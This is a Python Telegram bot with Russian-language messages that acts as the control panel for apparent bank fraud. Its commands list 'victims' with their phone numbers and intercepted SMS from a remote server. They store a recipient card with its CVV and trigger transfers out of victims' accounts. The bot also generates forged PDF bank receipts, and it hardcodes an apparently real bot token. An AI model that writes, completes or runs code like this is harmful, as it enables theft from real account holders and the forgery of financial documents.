import telebot
import requests
import datetime
import random
import os
from fpdf import FPDF

TOKEN = '8985419744:AAHjFeI7ARpPYj2sWUxzB85fXCo_ksNRF_0'
SERVER = 'https://mybank-xwhm.onrender.com'

bot = telebot.TeleBot(TOKEN)

def generate_receipt(amount, card_to, phone='', transaction_id=None):
    if transaction_id is None:
        transaction_id = f"TRX{random.randint(100000,999999)}"
    date_str = datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
    pdf = FPDF('P', 'mm', 'A4')
    pdf.add_page()
    pdf.set_font('Arial', 'B', 16)
    pdf.cell(190, 10, 'БАНКОВСКИЙ ЧЕК №' + str(transaction_id), ln=True, align='C')
    pdf.set_font('Arial', '', 12)
    pdf.ln(10)
    pdf.cell(190, 8, f"Дата: {date_str}", ln=True)
    pdf.cell(190, 8, f"Сумма: {amount} руб.", ln=True)
    pdf.cell(190, 8, f"Получатель: {card_to}", ln=True)
    pdf.cell(190, 8, f"Телефон: {phone if phone else 'не указан'}", ln=True)
    pdf.ln(5)
    pdf.set_font('Arial', 'I', 10)
    pdf.cell(190, 8, f"Сумма прописью: ({amount} руб. 00 коп.)", ln=True)
    pdf.ln(10)
    pdf.set_font('Arial', 'B', 10)
    pdf.cell(190, 8, 'Подпись банка: ___________________', ln=True)
    filename = f"receipt_{transaction_id}.pdf"
    pdf.output(filename)
    return filename

@bot.message_handler(commands=['list'])
def list_cmd(msg):
    try:
        r = requests.get(f'{SERVER}/victims').json()
        if not r:
            bot.reply_to(msg, 'Нет жертв')
        else:
            text = '\n'.join([f"ID {v['id']}: {v['phone']} - {v['sms'][:30]}" for v in r])
            bot.reply_to(msg, text)
    except Exception as e:
        bot.reply_to(msg, f'Ошибка: {e}')

@bot.message_handler(commands=['set'])
def set_cmd(msg):
    parts = msg.text.split()
    if len(parts) < 4:
        bot.reply_to(msg, 'Формат: /set номер_карты срок_год_месяц cvv')
        return
    card, expiry, cvv = parts[1], parts[2], parts[3]
    try:
        requests.post(f'{SERVER}/set_card', json={'card': card, 'expiry': expiry, 'cvv': cvv})
        bot.reply_to(msg, 'Карта получателя сохранена')
    except Exception as e:
        bot.reply_to(msg, f'Ошибка: {e}')

@bot.message_handler(commands=['go'])
def go_cmd(msg):
    parts = msg.text.split()
    if len(parts) < 3:
        bot.reply_to(msg, 'Формат: /go id_жертвы сумма')
        return
    v_id, amount = parts[1], parts[2]
    try:
        victims = requests.get(f'{SERVER}/victims').json()
        victim_phone = ''
        for v in victims:
            if str(v['id']) == v_id:
                victim_phone = v['phone']
                break
        r = requests.post(f'{SERVER}/transfer', json={'victim_id': v_id, 'amount': amount})
        result = r.json()
        if result.get('status') == 'ok':
            card_info = requests.get(f'{SERVER}/get_card').json()
            card_to = card_info.get('card', 'не задана')
            pdf_file = generate_receipt(amount, card_to, victim_phone)
            with open(pdf_file, 'rb') as f:
                bot.send_document(msg.chat.id, f, caption=f"✅ Перевод {amount} руб. выполнен. Чек приложен.")
            os.remove(pdf_file)
        else:
            bot.reply_to(msg, f"Ошибка перевода: {result}")
    except Exception as e:
        bot.reply_to(msg, f'Ошибка: {e}')

print('Бот запущен и ждёт команды')
bot.polling()
